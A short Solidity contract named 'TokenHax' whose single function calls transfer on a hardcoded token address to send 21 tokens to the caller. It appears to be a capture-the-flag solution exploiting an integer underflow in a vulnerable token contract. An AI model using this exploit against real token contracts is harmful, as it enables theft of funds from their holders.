// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenHax {
    function transferHax() public {
        Token(0x250e97CC79aC4A86501D0743F3b316Cf41c932f2).transfer(
            msg.sender,
            21
        );
    }
}
